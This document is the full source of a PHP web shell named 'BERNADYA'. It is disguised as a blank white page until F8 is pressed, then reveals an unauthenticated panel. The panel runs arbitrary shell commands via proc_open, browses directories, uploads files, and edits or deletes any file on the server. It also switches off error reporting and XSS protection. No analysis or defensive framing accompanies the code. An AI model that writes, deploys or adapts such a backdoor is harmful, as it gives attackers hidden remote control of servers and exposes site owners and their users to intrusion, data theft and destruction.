<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style type="text/css">
        @import url('https://fonts.googleapis.com/css?family=Open+Sans');

        body {
            font-family: "Open Sans", sans-serif;
            color: #fea6e2;
        }

        header {
            font-size: 4.0em;
            text-align: center;
            font-family: "Open Sans", sans-serif;
            text-decoration: underline overline 8px;
            padding: 12px;
        }

        content {
            font-family: "Open Sans", sans-serif;
            color: #fea6e2;
            font-size: 15px;
        }

        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 69%;
        }

        th, td {
            border-color: #fea6e2;
            border: 1.5pt solid #fea6e2;
            padding: 0.4rem;
            font-size: 13px;
            text-align: left;
        }

        th {
            background-color: #932C77;
            border-color: #fea6e2;
        }

        tr:nth-child(even) {
            background-color: #932C77;
        }

        tr:hover {
            background-color: #811F67;
        }

        input {
            background: #932C77;
            color: #fea6e2;
            border: 4px solid #fea6e2;
            padding: 10px;
        }

        input[type="file"]::file-selector-button {
            border: none;
            background: #932C77;
            padding: 10px 20px;
            color: #fea6e2;
            cursor: pointer;
            transition: background .2s ease-in-out;
        }

        input[type="file"]::file-selector-button:hover {
            background: #811F67;
            color: #fea6e2;
        }
    </style>
    <script>
        function checkF8(event) {
            if (event.key === "F8") {
                // If F8 is pressed, change background and title
                document.body.style.backgroundColor = "#932C77";
                document.title = "BACKNADYA";
                sessionStorage.setItem('f8Pressed', 'true');
                document.querySelector('.bernadya-content').style.display = 'block';
                document.querySelector('.f8-message').style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            if (sessionStorage.getItem('f8Pressed') === 'true') {
                document.title = "BACKNADYA";
                document.body.style.backgroundColor = '#932C77';
                document.querySelector('.bernadya-content').style.display = 'block';
                document.querySelector('.f8-message').style.display = 'none';
            } else {
                document.body.style.backgroundColor = 'white';  // White background before F8
                document.addEventListener('keydown', checkF8);
            }
        });
    </script>
</head>

<body>
    <div class="f8-message"></div>

    <div class="bernadya-content" style="display: none;">
        <?php
		session_start();
		error_reporting(E_ALL);
		header("X-XSS-Protection: 0");
		ob_start();
		set_time_limit(0);
		error_reporting(0);
		ini_set('display_errors', FALSE);
        function xor_encrypt($data, $key) {
            $key = str_repeat($key, ceil(strlen($data) / strlen($key)));
            return $data ^ $key;
        }

        function xor_decrypt($data, $key) {
            return xor_encrypt($data, $key);  // XOR decryption is same as encryption
        }

        function get_file_permissions($file) {
            return substr(sprintf('%o', fileperms($file)), -4);
        }

        function is_writable_permission($file) {
            return is_writable($file);
        }

        // Start session
        session_start();
        if (!isset($_SESSION['dir'])) {
            $_SESSION['dir'] = '.';  // Default directory is root
        }

        // Update directory if 'dir' is received from form
        if (isset($_POST['dir']) && is_dir($_POST['dir'])) {
            $_SESSION['dir'] = $_POST['dir'];  // Update directory if valid
        }

        // Get the directory stored in session
        $dir = $_SESSION['dir'];
        $files = scandir($dir);
        $current_dir = realpath($dir);

        // Handle file upload
        if (isset($_FILES['uploaded_file'])) {
            $file_name = $_FILES['uploaded_file']['name'];
            $file_tmp = $_FILES['uploaded_file']['tmp_name'];
            $file_dest = $dir . '/' . $file_name;

            if (move_uploaded_file($file_tmp, $file_dest)) {
                $upload_message = 'File uploaded successfully.';
            } else {
                $upload_message = 'Failed to upload the file.';
            }
        }

        // Handle file delete
        if (isset($_POST['delete_file'])) {
            $file_path = $_POST['delete_file'];
            if (unlink($file_path)) {
                $delete_message = 'File deleted successfully.';
            } else {
                $delete_message = 'Failed to delete the file.';
            }
        }

        // Handle file edit
        if (isset($_POST['edit_file'])) {
            $file_path = $_POST['edit_file'];
            $file_contents = file_get_contents($file_path);
            $edit_message = "You are editing: $file_path";
            if (isset($_POST['edited_contents'])) {
                $new_contents = $_POST['edited_contents'];
                if (file_put_contents($file_path, $new_contents)) {
                    $edit_message = "File saved successfully.";
                    $file_contents = $new_contents;
                } else {
                    $edit_message = "Failed to save the file.";
                }
            }
        }

        // Handle file save
        if (isset($_POST['save_file'])) {
            $file_path = $_POST['save_file'];
            $new_contents = $_POST['edited_contents'];
            if (file_put_contents($file_path, $new_contents)) {
                $save_message = "File saved successfully.";
                $file_contents = $new_contents;
            } else {
                $save_message = "Failed to save the file.";
            }
        }
        ?>
        
        <header>|BERNADYA|</header>
        
        <center>
            <form method="post">
                <input type="text" name="cm12" placeholder="berikan nadamu !">
                <input type="submit" value="nadakan!">
            </form><br>

            <?php
            if (isset($_POST["cm12"]) && !empty($_POST["cm12"])) {
                $bernadya = $_POST["cm12"];
                $process = proc_open($bernadya, [
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"],
                ], $pipes);
                
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    echo "<pre>$output</pre>";
                } else {
                    echo "Gagal bernadya!."; 
                }
            }
            ?>

            <content>
                <b><?php echo $current_dir; ?></b>

                <?php if (!empty($edit_message)): ?>
                    <h4>Edit File: <?php echo $edit_message; ?></h4>
                    <form action="" method="POST">
                        <textarea name="edited_contents" rows="10" cols="111" style="color:#fea6e2;border: none; background-color: transparent; padding: 7px 6px; cursor: pointer;"><?php echo htmlentities($file_contents); ?></textarea><br>
                        <input type="hidden" name="save_file" value="<?php echo $file_path; ?>">
                        <input type="submit" value="Save" style="border: none; padding: 10px 10px; background-color: transparent; color:#fea6e2; cursor: pointer;">
                    </form>
                <?php endif; ?>
                
                <?php if (!empty($delete_message)): ?>
                    <h4><?php echo $delete_message; ?></h4>
                <?php endif; ?>

                <?php if (!empty($upload_message)): ?>
                    <h4><?php echo $upload_message; ?></h4>
                <?php endif; ?>

                <?php if (!empty($save_message)): ?>
                    <h4><?php echo $save_message; ?></h4>
                <?php endif; ?>

                <form action="" enctype="multipart/form-data" method="POST">
                    <input type="file" name="uploaded_file" style="color:#fea6e2;border: none; background-color: transparent; padding: 7px 6px; cursor: pointer;">
                    <input type="submit" value="Upload" style="border: none; padding: 10px 10px; background-color: transparent; color:#fea6e2; cursor: pointer;">
                </form>

                <table>
                    <tr>
                        <th>Filename</th>
                        <th>Permissions</th>
                        <th>Actions</th>
                    </tr>

                    <?php foreach ($files as $file): ?>
                        <tr>
                            <td>
                                <?php if (is_dir($dir . '/' . $file)): ?>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="dir" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="<?php echo $file; ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? '#fea6e2' : '#bc002d'; ?>; background: transparent; border: none;">
                                    </form>
                                <?php else: ?>
                                    <?php echo $file; ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo get_file_permissions($dir . '/' . $file); ?></td>
                            <td>
                                <?php if (is_file($dir . '/' . $file)): ?>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="Edit" style="border: none; background-color: transparent; color:#fea6e2; cursor: pointer;">
                                    </form>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="Delete" style="border: none; background-color: transparent; color:#fea6e2; cursor: pointer;">
                                    </form>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </table>
            </content>
        </center>
    </div>
</body>
</html>
